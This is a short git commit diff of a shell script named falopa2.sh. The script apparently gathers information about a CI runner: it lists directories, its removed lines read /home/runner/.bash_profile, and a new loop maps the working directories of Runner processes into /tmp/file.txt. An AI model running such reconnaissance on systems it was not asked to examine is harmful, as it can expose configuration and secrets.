fcb22d0354458f991aed5de1327cf52aa5d02cbf
_m <matiasesena@gmail.com>
2021-11-05 20:36:39 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -5,13 +5,17 @@ echo "--- START ---" > /tmp/file.txt
 echo "--- ~/" >> /tmp/file.txt
 ls -1la ~/ >> /tmp/file.txt
 
-echo "--- /usr/local/bin" >> /tmp/file.txt
-ls -1la /usr/local/bin >> /tmp/file.txt
-echo "--- cat" >> /tmp/file.txt
-cat /home/runner/.bash_profile >> /tmp/file.txt
+#echo "--- /usr/local/bin" >> /tmp/file.txt
+#ls -1la /usr/local/bin >> /tmp/file.txt
 
-echo "--- $HOME/.local/bin" >> /tmp/file.txt
-ls -1la $HOME/.local/bin >> /tmp/file.txt
+echo "--- $HOME/.local/bin/" >> /tmp/file.txt
+ls -1la $HOME/.local/bin/ >> /tmp/file.txt
+
+for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
+do
+    echo "---$pid---" >> /tmp/file.txt;
+    echo $(pwdx $pid)
+done
 
 echo "--- FINISH ---" >> /tmp/file.txt
 
